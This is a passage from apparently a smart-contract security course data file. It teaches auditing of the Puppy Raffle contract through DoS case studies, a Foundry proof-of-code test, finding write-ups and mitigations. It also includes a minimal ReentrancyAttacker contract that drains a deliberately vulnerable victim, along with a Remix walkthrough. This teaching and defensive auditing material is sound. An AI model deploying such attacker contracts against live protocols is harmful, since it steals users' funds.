          The problem arises from a boolean indicator called `shouldUnwrapNativeToken`. This flag can be leveraged to set up positions that can't be reduced by liquidations or ADL (Auto-Deleveraging) orders. When the native token unwraps (with the flag set to true), a position can be formed by a contract that can't receive the native token. This leads to order execution reverting, causing a crucial function of the protocol to become unexecutable.

          ### Into the Code

          Let's investigate what this looks like in code.

          Within the GMX V2 `DecreaseOrderUtils` library we have the `processOrder` function. While processing an order with this library we eventually will call `transferNativeToken` within `TokenUtils.sol`.

          ```js
          function transferNativeToken(DataStore dataStore, address receiver, uint256 amount) internal {
             if (amount == 0) {return;}

             uint256 gasLimit = dataStore.getUint(keys.NATIVE_TOKEN_TRANSFER_GAS_LIMIT);

             (bool success, bytes memory data) = payable(receiver).call{value: amount, gas: gasLimit} ("");

             if (success){return;}

             string memory reason = string(abi.encode(data));
             emit NativeTokenTransferReverted(reason);

             revert NativeTokenTransferError(receiver, amount);
          }

          ```

          Ultimately, this is where the problem lies. When a position in the protocol is liquidated, or de-leveraged, and the `shouldUnwrapNativeToken` flag is true, this function is called in the process.

          Were the `receiver` address a contract which was unable to receive value - the liquidation of the user would revert every time.

          This is a critical flaw!

          You may notice another potential vulnerability in the same function - the `gasLimit`. Were the receiver a contract address which expended unnecessary gas in it's receive function - this call would also revert!

          ### Wrap Up

          To summarize, here are a couple things to keep an eye out for which may lead to DoS attacks:

          1. **For-Loops**: Take extra caution with for-loops. Ask yourself these questions:
             - Is the iterable entity bounded by size?
             - Can a user append arbitrary items to the list?
             - How much does it cost the user to do so?
          2. **External calls**: These can be anything from transfering Eth to calling a third-party contract. Evaluate ways these external calls could fail, leading to an incomplete transaction.

          DoS attacks put simply are - the denial of functions of a protocol. They can arise from multiple sources, but the end result is always a transaction failing to execute.

          Be vigilant for the above situations in your security reviews. Let's next look at what a PoC for Denial of Service is like.
        description: 'Joined by Owen, we look into 2 case studies of real life DoS attacks: GMX V2 and the Bridges Exchange.'
      -
        id: 89c740dd-2506-4ce9-87a8-41f58e0a1076
        type: new_lesson
        enabled: true
        title: 'DoS PoC'
        slug: dos-poc
        duration: 8
        video_url: mZ00aPnzz01LUw01Ao1lRc7HOu3WVCQUanHv00n6MzXUGgw
        raw_markdown_url: /routes/security/4-puppy-raffle/13-dos-poc/+page.md
        markdown_content: |-
          ---
          title: DoS - PoC (Proof of Code)
          ---

          _Follow along with this video:_

          ---

          ### Back to Puppy Raffle

          Now that we possess a little more context and understanding of what a `Denial of Service` attack is, and what it can mean for a protocol, let's return to Puppy Raffle and remind ourselves where we began.

          ```js
          /// @notice this is how players enter the raffle
          /// @notice they have to pay the entrance fee * the number of players
          /// @notice duplicate entrants are not allowed
          /// @param newPlayers the list of players to enter the raffle
          function enterRaffle(address[] memory newPlayers) public payable {
              require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
              for (uint256 i = 0; i < newPlayers.length; i++) {
                  players.push(newPlayers[i]);
              }

              // Check for duplicates
              for (uint256 i = 0; i < players.length - 1; i++) {
                  for (uint256 j = i + 1; j < players.length; j++) {
                      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                  }
              }
              emit RaffleEnter(newPlayers);
          }
          ```

          This should look very familiar to us by now:

          ```js
          // Check for duplicates
          // @audit Possible DoS
          for (uint256 i = 0; i < players.length - 1; i++) {
              for (uint256 j = i + 1; j < players.length; j++) {
                  require(players[i] != players[j], "PuppyRaffle: Duplicate player");
              }
          }
          ```

          At this point I would add this to my `notes.md`, you may want to come back to this later and continue assessing the code back, but let's go ahead and prove this finding now.

          ### Proof of Code

          If the protocol has an existing test suite, it's often easier to add our tests to it then write things from scratch.

          Run `forge test` to make sure the test suite is working correctly so far!

          There are lots of useful parts of `PuppyRaffle.t.sol` we can use for our PoC.

          Now, here's your challenge. I want you to try and write the `Proof of Code` yourself. Build those skills by trying to write a test function that shows the potential `Denial of Service` we've uncovered.

          <details>
          <summary> The Proof of Code </summary>

          Great! Now that you've _100%_ tried this yourself, let's go through it together.

          I would start by harvesting the existing `testCanEnterRaffle` function. This is a great boilerplate for what we're trying to show.

          ```js
          function testCanEnterRaffle() public {
              address[] memory players = new address[](1);
              players[0] = playerOne;
              puppyRaffle.enterRaffle{value: entranceFee}(players);
              assertEq(puppyRaffle.players(0), playerOne);
          }
          ```

          Let's repurpose this!

          ```js
          function testDenialOfService() public {
              // Foundry lets us set a gas price
              vm.txGasPrice(1);

              // Creates 100 addresses
              uint256 playersNum = 100;
              address[] memory players = new address[](playersNum);
              for(uint i = 0; i < players.length; i++){
                  players[i] = address(i);
              }

              // Gas calculations for first 100 players
              uint256 gasStart = gasleft();
              puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
              uint256 gasEnd = gasleft();
              uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
              console.log("Gas cost of the first 100 players: ", gasUsedFirst);
          }
          ```

          Running the command `forge test --mt testDenialOfService -vvv` should give us an output like this:

          <img src="/security-section-4/13-dos-poc/dos-poc1.png" style="width: 75%; height: auto;">

          Now let's do the same thing for the second 100 players! We'll need to add something like this to our test.

          ```js
          // Creats another array of 100 players
          address[] memory playersTwo = new address[](playersNum);
          for (uint256 i = 0; i < playersTwo.length; i++) {
              playersTwo[i] = address(i + playersNum);
          }

          // Gas calculations for second 100 players
          uint256 gasStartTwo = gasleft();
          puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
          uint256 gasEndTwo = gasleft();
          uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
          console.log("Gas cost of the second 100 players: ", gasUsedSecond);

          assert(gasUsedFirst < gasUsedSecond);
          ```

          If we rerun our test we can see.. Our test passes! The second 100 players are paying _a LOT_ more and are at a significant disadvantage!

          <img src="/security-section-4/13-dos-poc/dos-poc2.png" style="width: 75%; height: auto;">

          </details>

          ---

          ### Wrap Up

          That's all there is to it. We've clearly shown a potential `Denial of Service` through our `Proof of Code`. This test function is going to go right into our report.

          Let's do that now!
        description: 'Puppy Raffle Denial of Service Attack - Identify and Test. Main focus: Unfair cost increase for late entrants, disadvantaging new players.'
      -
        id: 3eda855d-5826-4449-aeea-cd481090ba34
        type: new_lesson
        enabled: true
        title: 'DoS: Reporting'
        slug: dos-reporting
        duration: 8
        video_url: XL5qC8ErrYyD16uRBXQSVbJl9EVAXB301jLbmdnkpLQY
        raw_markdown_url: /routes/security/4-puppy-raffle/14-dos-reporting/+page.md
        markdown_content: |-
          ---
          title: DoS - Reporting
          ---

          _Follow along with this video:_

          ---

          ### Denial of Service PoC

          Maybe you're the type of security reviewer who likes to save all the write ups to the end. There's nothing wrong with that! As you grow and gain experience you'll begin to carve out your own workflow and ways of doing things.

          In future lessons, we may not go through writing things up together, but for now - let's report this uncovered DoS vulnverability

          We of course start with our template, create a `findings.md` file and paste this within:

          ---

          ### [S-#] TITLE (Root Cause + Impact)

          **Description:**

          **Impact:**

          **Proof of Concept:**

          **Recommended Mitigation:**

          ---

          ### Title

          Remember the rule of thumb!

          `<ROOT CAUSE> + Impact`.

          So, what's our root cause? Looping through an array to check for duplicates is the cause. What about the impact? Well, this causes a denial of service due to incrementing gas costs!

          So the title I'm going with is something like this:

          ```
          ### [S-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants
          ```

          What can I say, I like to be verbose, but at least I'm clear!

          Regarding severity, let's consider the impact vs likelihood of this scenario.

          Impact - The protocol is unlikely to fully break, it simply makes the raffle more expensive to participate in. I might rate this a `Medium`.

          Likelihood - If an attacker wants the NFT badly enough, this will surely happen - but it does cost the attacker a lot. I might settle with `Medium` here as well.

          With an Impact of `Medium` and a likelihood of `Medium`, this finding's severity is going to be decidedly `Medium`.

          Update our title appropriately `[M-#]`.

          ### When to do Writeups

          Often, I won't do a whole writeup as soon as I think I've found something. The reason for this is simple - I might be wrong! It's entirely possible that I come across more information as I dive deeper into the protocol that makes clear that what I thought was an issue actually isn't.

          Sometimes I'll just leave my in-line notes indicating my suspicions and come back to them at the end.

          For now, let's write the report as though we're confident this is valid.

          ### Description

          Feel free to write your own description! Remember we want to be clear in how we illustrate the vulnerability and its affects.

          Here's mine.

          ```
          **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

          '''javascript
          // @audit Dos Attack
          @> for(uint256 i = 0; i < players.length -1; i++){
              for(uint256 j = i+1; j< players.length; j++){
              require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
            }
          }
          '''
          ```

          ### Impact

          This is pretty clear from our description, but we can expand on things a little more.

          ```
          **Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

          An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.
          ```

          ### Proof of Concept/Code

          We did the hard part of this in our previous lesson, but let's add it to our report.

          ```
          **Proof of Concept:**

          If we have 2 sets of 100 players enter, the gas costs will be as such:
          - 1st 100 players: ~6252048 gas
          - 2nd 100 players: ~18068138 gas

          This is more than 3x more expensivee for the second 100 players.

          <details>
          <summary>Proof of Code</summary>

          '''js
          function testDenialOfService() public {
                // Foundry lets us set a gas price
                vm.txGasPrice(1);

                // Creates 100 addresses
                uint256 playersNum = 100;
                address[] memory players = new address[](playersNum);
                for (uint256 i = 0; i < players.length; i++) {
                    players[i] = address(i);
                }

                // Gas calculations for first 100 players
                uint256 gasStart = gasleft();
                puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
                uint256 gasEnd = gasleft();
                uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
                console.log("Gas cost of the first 100 players: ", gasUsedFirst);

                // Creats another array of 100 players
                address[] memory playersTwo = new address[](playersNum);
                for (uint256 i = 0; i < playersTwo.length; i++) {
                    playersTwo[i] = address(i + playersNum);
                }

                // Gas calculations for second 100 players
                uint256 gasStartTwo = gasleft();
                puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
                uint256 gasEndTwo = gasleft();
                uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
                console.log("Gas cost of the second 100 players: ", gasUsedSecond);

                assert(gasUsedSecond > gasUsedFirst);
            }
          '''

          </details>
          ```

          ### Wrap Up

          Click below to see what our finding report should look like so far!

          <details>
          <Summary>DoS Writeup</summary>

          ### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

          **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

          ```javascript
          // @audit Dos Attack
          @> for(uint256 i = 0; i < players.length -1; i++){
              for(uint256 j = i+1; j< players.length; j++){
              require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
            }
          }
          ```

          **Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

          An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

          **Proof of Concept:**

          If we have 2 sets of 100 players enter, the gas costs will be as such:

          - 1st 100 players: ~6252048 gas
          - 2nd 100 players: ~18068138 gas

          This is more than 3x more expensivee for the second 100 players.

          <details>
          <summary>Proof of Code</summary>

          ```js
          function testDenialOfService() public {
                // Foundry lets us set a gas price
                vm.txGasPrice(1);

                // Creates 100 addresses
                uint256 playersNum = 100;
                address[] memory players = new address[](playersNum);
                for (uint256 i = 0; i < players.length; i++) {
                    players[i] = address(i);
                }

                // Gas calculations for first 100 players
                uint256 gasStart = gasleft();
                puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
                uint256 gasEnd = gasleft();
                uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
                console.log("Gas cost of the first 100 players: ", gasUsedFirst);

                // Creats another array of 100 players
                address[] memory playersTwo = new address[](playersNum);
                for (uint256 i = 0; i < playersTwo.length; i++) {
                    playersTwo[i] = address(i + playersNum);
                }

                // Gas calculations for second 100 players
                uint256 gasStartTwo = gasleft();
                puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
                uint256 gasEndTwo = gasleft();
                uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
                console.log("Gas cost of the second 100 players: ", gasUsedSecond);

                assert(gasUsedSecond > gasUsedFirst);
            }
          ```

          </details>
          <br>

          **Recommended Mitigations:**

          </details>

          ---

          Things look great! Lets finally have a look at what mitigations we can recommend for this vulnerability, in the next lesson.
        description: 'How to create a DOS security review report. Step-by-step process including title, root cause, impact, severity, likelihood, and mitigation strategy.'
      -
        id: 48c3d22f-6318-47cb-8781-f8d732186cd4
        type: new_lesson
        enabled: true
        title: 'DoS: Mitigation'
        slug: dos-mitigation
        duration: 3
        video_url: nX4J02l7F7OyMhMKc021g2XMWiVTlCJIe6EQlnntumps8
        raw_markdown_url: /routes/security/4-puppy-raffle/15-dos-mitigation/+page.md
        markdown_content: |-
          ---
          title: DoS - Mitigation
          ---

          _Follow along with this video:_

          ---

          ### Recommended Mitigation

          Our next step, of course, is providing a recommendation on how to fix this issue.

          We may be tempted to suggest something like _"Don't check for duplicates."_, but it's important to preserve the original functionality as much as possible. If we do suggest a change in functionality, we must be clear in explaining why.

          With that said, here are some potential suggestions we could make.

          1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

          2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

          ```diff
          +    mapping(address => uint256) public addressToRaffleId;
          +    uint256 public raffleId = 0;
              .
              .
              .
              function enterRaffle(address[] memory newPlayers) public payable {
                  require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
                  for (uint256 i = 0; i < newPlayers.length; i++) {
                      players.push(newPlayers[i]);
          +            addressToRaffleId[newPlayers[i]] = raffleId;
                  }

          -        // Check for duplicates
          +       // Check for duplicates only from the new players
          +       for (uint256 i = 0; i < newPlayers.length; i++) {
          +          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
          +       }
          -        for (uint256 i = 0; i < players.length; i++) {
          -            for (uint256 j = i + 1; j < players.length; j++) {
          -                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
          -            }
          -        }
                  emit RaffleEnter(newPlayers);
              }
          .
          .
          .
              function selectWinner() external {
          +       raffleId = raffleId + 1;
                  require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
          ```

          3. Alternatively, you could use [**OpenZeppelin's EnumerableSet library**](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

          ### Wrap Up

          That's all there is to it! Let's add this recommendation to our `findings.md` report for this vulnerability and we can move on to the next issue!

          <details>
          <Summary>DoS Writeup</summary>

          ### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

          **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

          ```javascript
          // @audit Dos Attack
          @> for(uint256 i = 0; i < players.length -1; i++){
              for(uint256 j = i+1; j< players.length; j++){
              require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
            }
          }
          ```

          **Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

          An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

          **Proof of Concept:**

          If we have 2 sets of 100 players enter, the gas costs will be as such:

          - 1st 100 players: ~6252048 gas
          - 2nd 100 players: ~18068138 gas

          This is more than 3x more expensivee for the second 100 players.

          <details>
          <summary>Proof of Code</summary>

          ```js
          function testDenialOfService() public {
                // Foundry lets us set a gas price
                vm.txGasPrice(1);

                // Creates 100 addresses
                uint256 playersNum = 100;
                address[] memory players = new address[](playersNum);
                for (uint256 i = 0; i < players.length; i++) {
                    players[i] = address(i);
                }

                // Gas calculations for first 100 players
                uint256 gasStart = gasleft();
                puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
                uint256 gasEnd = gasleft();
                uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
                console.log("Gas cost of the first 100 players: ", gasUsedFirst);

                // Creats another array of 100 players
                address[] memory playersTwo = new address[](playersNum);
                for (uint256 i = 0; i < playersTwo.length; i++) {
                    playersTwo[i] = address(i + playersNum);
                }

                // Gas calculations for second 100 players
                uint256 gasStartTwo = gasleft();
                puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
                uint256 gasEndTwo = gasleft();
                uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
                console.log("Gas cost of the second 100 players: ", gasUsedSecond);

                assert(gasUsedSecond > gasUsedFirst);
            }
          ```

          </details>
          <br>

          **Recommended Mitigations:** There are a few recommended mitigations.

          1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
          2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

          ```diff
          +    mapping(address => uint256) public addressToRaffleId;
          +    uint256 public raffleId = 0;
              .
              .
              .
              function enterRaffle(address[] memory newPlayers) public payable {
                  require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
                  for (uint256 i = 0; i < newPlayers.length; i++) {
                      players.push(newPlayers[i]);
          +            addressToRaffleId[newPlayers[i]] = raffleId;
                  }

          -        // Check for duplicates
          +       // Check for duplicates only from the new players
          +       for (uint256 i = 0; i < newPlayers.length; i++) {
          +          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
          +       }
          -        for (uint256 i = 0; i < players.length; i++) {
          -            for (uint256 j = i + 1; j < players.length; j++) {
          -                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
          -            }
          -        }
                  emit RaffleEnter(newPlayers);
              }
          .
          .
          .
              function selectWinner() external {
          +       raffleId = raffleId + 1;
                  require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
          ```

          3. Alternatively, you could use [**OpenZeppelin's EnumerableSet library**](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

          </details>
        description: 'How to Remove Duplicates from Arrays with Patrick'
      -
        id: 0733bc61-511d-4f22-8773-3b4239943a85
        type: new_lesson
        enabled: true
        title: 'Exploit: Business logic edge case'
        slug: exploit-business-logic-edge-case
        duration: 3
        video_url: gpV00mHPi15v024Efr11vjG53d0200AWOLPrwLkkFU2BEKk
        raw_markdown_url: /routes/security/4-puppy-raffle/16-exploit-business-logic-edge-case/+page.md
        markdown_content: |-
          ---
          title: Exploit - Business Logic Edge Case
          ---

          _Follow along with this video:_

          ---

          ### Business Logic Edge Case

          By now we've identified fairly clearly how the `enterRaffle` function works. Our finding looks great. Let's next move onto the `refund` function, this one was mentioned explicitly in our documention.

          ```
          Users are allowed to get a refund of their ticket & value if they call the refund function
          ```

          This is what the function looks like.

          ```js
          /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
          /// @dev This function will allow there to be blank spots in the array
          function refund(uint256 playerIndex) public {
              address playerAddress = players[playerIndex];
              require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
              require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

              payable(msg.sender).sendValue(entranceFee);

              players[playerIndex] = address(0);
              emit RaffleRefunded(playerAddress);
          }
          ```

          Remember to start with the documentation so that we understand what's supposed to happen. In order to call this function a player needs to provide their `playerIndex`, and this is acquired through the `getActivePlayerIndex` function.

          Let's jump over there quickly.

          ```js
          /// @notice a way to get the index in the array
          /// @param player the address of a player in the raffle
          /// @return the index of the player in the array, if they are not active, it returns 0
          function getActivePlayerIndex(address player) external view returns (uint256) {
              for (uint256 i = 0; i < players.length; i++) {
                  if (players[i] == player) {
                      return i;
                  }
              }
              return 0;
          }
          ```

          I think we may have stumbled upon our next bug. The logic here has a problem. Can you spot it?

          <details>
          <summary>The Problem</summary>
          <br>

          When looking at this function, we have to ask _"Why is this returning zero?"_

          Arrays begin at index 0, were the player at this index to call this function it would be very unclear whether or not they were in the raffle or not!

          </details>

          ### Wrap Up

          We're not going to go through writing this finding report together, but I absolutely challenge you to write one yourself before moving forward!

          **\*Hint:** It's informational severity\*

          Up next we're going back to the `refund` function!
        description: 'Patrick discusses the potential impacts of a user entering PuppyRaffle with a smart contract.'
      -
        id: a4298f9d-7469-40b4-864d-437f10d6bbf4
        type: new_lesson
        enabled: true
        title: 'Recon: Refund'
        slug: recon-refund
        duration: 3
        video_url: PuTubb3L021vIcpDZ6gYqQJqIH1rvMLxS5cGAwTu2eBM
        raw_markdown_url: /routes/security/4-puppy-raffle/17-recon-refund/+page.md
        markdown_content: |-
          ---
          title: Recon - Refund
          ---

          _Follow along with this video:_

          ---

          ### Return to Refund

          Coming back to the refund function, let's have a closer look.

          ```js
          /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
          /// @dev This function will allow there to be blank spots in the array
          function refund(uint256 playerIndex) public {
              address playerAddress = players[playerIndex];
              require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
              require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

              payable(msg.sender).sendValue(entranceFee);

              players[playerIndex] = address(0);
              emit RaffleRefunded(playerAddress);
          }
          ```

          This function takes a player's index, and checks the `players` array for the appropriate address. Following this we see two require statements.

          ```js
          require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
          require(playerAddress !=
            address(0), "PuppyRaffle: Player already refunded, or is not active");
          ```

          The first is ensuring that only a player can refund their own ticket/fee.

          The second, while a little less clear, makes more sense if we see how a player is handled after a refund is processed - their `players` index is set to `address(0)`. So the second require is meant to prevent multiple refunds this way.

          ```js
          players[playerIndex] = address(0);
          ```

          Before this however, we see the `sendValue` function being called. This is what returns the `entranceFee` back to the player.

          ---

          `sendValue` may look unusual, this is just a simplfied method to transfer funds contained within the [**OpenZeppelin Address.sol library**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol).

          > ```js
          > function sendValue(address payable recipient, >uint256 amount) internal {
          >        if (address(this).balance < amount) {
          >            revert AddressInsufficientBalance(address(this));
          >        }
          >
          >        (bool success, ) = recipient.call{value: amount}("");
          >        if (!success) {
          >            revert FailedInnerCall();
          >        }
          >    }
          > ```

          ---

          ### Wrap Up

          Already we can see the order of things is going to cause another potential issue. Do you know what it is? Can you spot it?
        description: 'Continuing our Recon of PuppyRaffle with the Refund function.'
      -
        id: 8596fc74-6778-4b65-bc85-56bedf6e1808
        type: new_lesson
        enabled: true
        title: 'Exploit: Reentrancy'
        slug: exploit-reentrancy
        duration: 14
        video_url: 2KjHW8LArPS02RZNZb02FweQUeF69mVeusNbTOxuQit94
        raw_markdown_url: /routes/security/4-puppy-raffle/18-exploit-reentrancy/+page.md
        markdown_content: |-
          ---
          title: Exploit - Reentrancy
          ---

          _Follow along with this video:_

          ---

          Let's see if we can nail down this vulnerability. When we'd run `Slither` earlier, you may recall it had actually found something...

          Run it again and we'll have a closer look.

          ```bash
          slither .
          ```

          Looking through the output, we can see `Slither` is in fact detecting things in our `refund` function!

          <img src="/security-section-4/18-exploit-reentrancy/exploit-reentrancy1.png" style="width: 75%; height: auto;">

          ### What is a re-entrancy attack and how does it work?

          For this lesson we'll be heavily leaning on our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo for diagrams and examples to reference. Be sure to clone it so you can see how these vulnerabilities work locally.

          Here's our example contract:

          ```js
          contract ReentrancyVictim {
              mapping(address => uint256) public userBalance;

              function deposit() public payable {
                  userBalance[msg.sender] += msg.value;
              }

              function withdrawBalance() public {
                  uint256 balance = userBalance[msg.sender];
                  // An external call and then a state change!
                  // External call
                  (bool success,) = msg.sender.call{value: balance}("");
                  if (!success) {
                      revert();
                  }

                  // State change
                  userBalance[msg.sender] = 0;
              }
          }
          ```

          Fairly simple. Under normal circumstances

          User A (balance 10 ether) can deposit funds

          1. deposit{value: 10 ether}

             <br>userBalance[UserA] = 10 ether
             <br>contract balance = 10 ether
             <br>User A balance = 0 ether

          And then withdraw them

          2. withdrawBalance

             <br>userBalance[UserA] = 0 ether
             <br>contract balance = 0 ether
             <br>User A balance = 10 ether

          The order of operations is reeally important in these situations. In our `withdrawBalance` function, we see that the function is making an external call _before_ updating the state of the contract.

          What this means, is that an attacker could have that external call be made in such a way that it triggers a call of the `withdrawBalance` function again (hence - reentrancy).

          ```js
          contract ReentrancyAttacker {
              ReentrancyVictim victim;

              constructor(ReentrancyVictim _victim) {
                  victim = _victim;
              }

              function attack() public payable {
                  victim.deposit{value: 1 ether}();
                  victim.withdrawBalance();
              }

              receive() external payable {
                  if (address(victim).balance >= 1 ether) {
                      victim.withdrawBalance();
                  }
              }
          }
          ```

          Consider the above attack contract. Seems pretty benign, but let's walk through what's actually happening.

          1. Attacker calls the attack function which deposits 1 ether, then immediately withdraws it.

          ```js
          function attack() public payable {
                  victim.deposit{value: 1 ether}();
                  victim.withdrawBalance();
              }
          ```

          2. The `ReentrancyVictim` contract does what's it's supposed to and received the deposit, then processs the withdrawal. During this process the victim contract makes a call to the attacker's contract.

          **NOTE: THIS IS BEFORE OUR BALANCE HAS BEEN UPDATED**

          ```js
          (bool success,) = msg.sender.call{value: balance}("");
                  if (!success) {
                      revert();
                  }
          ```

          What happens when a contract receives value? It's going have it's receive/fallback functions triggered. And what does our Attacker's receive function look like?

          ```js
          receive() external payable {
                  if (address(victim).balance >= 1 ether) {
                      victim.withdrawBalance();
                  }
              }
          ```

          It calls the `withdrawBalance` function again! Because our previous `withdrawBalance` hasn't updated our balance yet, the contract will happily let us withdraw again.. and again .. and again until all funds are drained.

          Let's look at this all put together.

          <img src="/security-section-4/18-exploit-reentrancy/exploit-reentrancy2.png" style="width: 75%; height: auto;">

          ### Wrap Up

          Re-entrancy is a a big deal and it's very impactful when it happens. We're really going to nail down our understanding of this attack vector before moving on.

          At it's most minimalistic, re-entrancy generates a loop that continually drains funds from a protocol.

          <img src="/security-section-4/18-exploit-reentrancy/exploit-reentrancy3.png" style="width: 75%; height: auto;">

          Our next lesson is going to be a hands on example of this vulnerability in Remix. Let's see what this exploit is like in action.
        description: 'Reentrancy Attack in PuppyRaffle: Deposit-Withdraw Loop Steals Funds'
      -
        id: 4e5253aa-7047-431d-8c16-c6b408be05e9
        type: new_lesson
        enabled: true
        title: 'Reentrancy: Remix example'
        slug: reentrancy-remix-example
        duration: 4
        video_url: ofbpMEnxat1l00hO021o6i2UfPCttt00jO6SN1Ch52QzA8
        raw_markdown_url: /routes/security/4-puppy-raffle/19-reentrancy-remix-example/+page.md
        markdown_content: |-
          ---
          title: Reentrancy - Remix Example
          ---

          _Follow along with this video:_

          ---

          ### Re-entrancy Remix Example

          The crux to this vulnerability lies in that we're updating the user's balance _last_.

          ```js
              function withdrawBalance() public {
                  uint256 balance = userBalance[msg.sender];
                  // An external call and then a state change!
                  // External call
                  (bool success,) = msg.sender.call{value: balance}("");
                  if (!success) {
                      revert();
                  }

                  // State change
                  userBalance[msg.sender] = 0;
              }
          ```

          The prevention of re-entrancy is actually very simple.

          ```js
          function withdrawBalance() public {
                  uint256 balance = userBalance[msg.sender];

                  // State change
                  userBalance[msg.sender] = 0;

                  // External call
                  (bool success,) = msg.sender.call{value: balance}("");
                  if (!success) {
                      revert();
                  }
              }
          ```

          That's it!

          The first time this function is called now, the user's balance is updated to zero before making external calls. This means if an enternal call causes this function to be called again - the user's balance will already be updated as zero, so no further funds will be withdrawn.

          Let's see this in action, in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).

          ### Trying it Out

          Once you're in remix with the re-entrancy examples open, begin by compiling and deploying both contracts.

          _Be sure to deploy both contracts, first `ReentrancyVictim` then `ReentrancyAttacker`_

          <img src="/security-section-4/19-reentrancy-remix/reentrancy-remix1.png" style="width: 75%; height: auto;">

          Both contracts should have 0 balance. Begin by having a sucker deposit 5 ether into `ReentrancyVictim` contract.

          <img src="/security-section-4/19-reentrancy-remix/reentrancy-remix2.png" style="width: 75%; height: auto;">

          Now, change the account/wallet you're calling functions from (near the top). Our `ReentrancyAttacker::attack` function requires at least 1 ether. Once that's set and our attack function is called...

          <img src="/security-section-4/19-reentrancy-remix/reentrancy-remix3.png" style="width: 75%; height: auto;">

          The attacker has made off with all of the protocol's ETH!

          ### Wrap Up

          We've seen how impactful overlooked re-entrancy can be and we've seen it in action through remix. Our sc-exploits-minimized repo has some test suites included that will illustrate things locally as well. I encourage you to take a look at those and familiarize yourself with them between lessons if you want to learn more and build on your experience.

          In the next lesson we'll approach how to safeguard ourselves and protocols from re-entrancy.
        description: "Patrick shows a hacker draining a user's balance via Remix using re-entrancy exploit."
      -
